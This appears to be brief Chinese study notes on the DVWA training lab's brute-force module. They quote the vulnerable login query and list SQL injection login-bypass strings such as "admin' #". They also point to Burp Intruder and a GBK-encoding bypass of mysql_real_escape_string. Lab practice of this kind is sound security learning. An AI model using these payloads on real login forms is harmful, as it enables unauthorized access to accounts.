# dvwa

## bruteforce

### level：low  
<b>1.注入方式：</b>
-   源码：query  = "SELECT * FROM \`users\` WHERE user = '\$user' AND password = '\$pass';"   
-    admin' #  &emsp;或者	&emsp;admin' -- a   &emsp;或者&emsp; a' or '1' = '1' limit 1 #

### level:medium

<b>1.暴力破解 </b> 
-   burpsuit intruder
-   MySQL5.5.37以下版本如果设置编码为GBK，能够构造编码绕过mysql_real_escape_string 对单引号的转义



